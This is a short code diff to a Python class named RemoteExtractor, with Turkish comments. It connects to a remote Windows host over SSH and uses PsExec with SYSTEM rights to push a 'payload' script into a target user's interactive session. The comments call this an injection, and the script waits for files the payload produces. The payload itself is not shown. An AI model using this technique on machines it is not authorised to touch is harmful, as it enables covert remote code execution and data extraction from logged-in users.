@@ -68,11 +68,14 @@ class RemoteExtractor:
             stdin, stdout, stderr = self.ssh.exec_command("where python")
             python_paths = stdout.read().decode('utf-8', errors='ignore').strip().split('\n')
             python_exe = python_paths[0].strip() if python_paths and python_paths[0].strip() else "python"
+            if "INFO:" in python_exe or "Could not find" in python_exe:
+                python_exe = "python"
+                
             print(f"[{self.host}] Python Calistiricisi: {python_exe}")
             
-            # PsExec ile Sesson 0'dan kurtulup hedef kullanicinin ekranina scripti at
-            psexec_cmd = f'cmd.exe /c "set PATH=C:\\PSTools;%PATH% && psexec -i {session_id} -s -accepteula \\"{python_exe}\\" {payload_remote_path}"'
-            print(f"[{self.host}] PsExec PowerShell Enjeksiyon komutu atiliyor...")
+            # Paramiko SSH zaten cmd.exe baglami acar, cmd.exe /c ile tekrar sarmaya gerek yok
+            psexec_cmd = f'set PATH=C:\\PSTools;%PATH% && psexec -i {session_id} -s -accepteula "{python_exe}" {payload_remote_path}'
+            print(f"[{self.host}] PsExec Python Enjeksiyon komutu atiliyor...")
             
             # Asenkron tetikledigimiz icin scriptin bitmesini (dosyalarin uretilmesini) bekle
             # Normal sartlarda bu 5-10 saniye surer. Ekrani kilitliyse psexec asili kalabilir, timeout koyalim.
